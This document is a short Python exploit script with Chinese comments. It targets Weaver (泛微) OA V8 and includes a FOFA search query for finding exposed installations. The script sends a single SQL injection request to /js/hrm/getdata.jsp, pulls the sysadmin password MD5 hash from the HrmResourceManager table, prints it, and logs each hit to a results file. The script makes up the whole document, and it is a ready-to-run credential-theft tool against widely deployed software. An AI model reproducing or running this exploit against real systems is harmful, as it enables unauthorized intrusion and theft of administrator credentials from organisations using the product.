# 泛微OA V8 SQL注入获取管理员(sysadmin)MD5后的密码信息
# fofa:  app="泛微-协同办公OA"

import requests
import urllib3
from  multiprocessing import Pool
urllib3.disable_warnings()

def title():
    print("[-----------------------------------------    --------]")
    print("[------------    泛微OA V8 SQL注入     ---------------]")
    print("[--------    usage:python3 weaverSQL_exp.py     ------]")
    print("[-------------------------------------------    ------]")

headers = {

    "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"

}

def target_url(url):
    target_url = url + "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager"
    try:
        res = requests.get(url=target_url,headers=headers,verify=False,timeout=10)
        if res.status_code == 200:
            print(f"\033[32m[+]目标系统: {url} 存在SQL注入！\033[0m")
            print("\033[32m[+] 正在查询sysadmin密码信息.......\033[0m")
            print(f"\033[32m[+]用户: sysadmin   密码MD5: {res.text.strip()}\033[0m")
            print("[---------------------------------------------------------------------]")
            with open('result.txt', 'a', encoding='utf8') as re:
                re.write("目标 {} 存在SQL注入\n用户名: sysadmin 密码MD5:{}\n\n".format(target_url,res.text.strip()))
        else:
            print(f"\033[31m[x]目标系统: {url} 不存在SQL注入！\033[0m")
            print("[---------------------------------------------------------------------]")
    except Exception as e:
        print(f"\033[31m[x]目标系统: {url} 存在未知错误！\033[0m\n",e)
        print("[---------------------------------------------------------------------]")


if __name__ == "__main__":
    title()
    url  = str(input("\033[35m请输入需要测试url地址: \033[0m"))
    target_url(url)

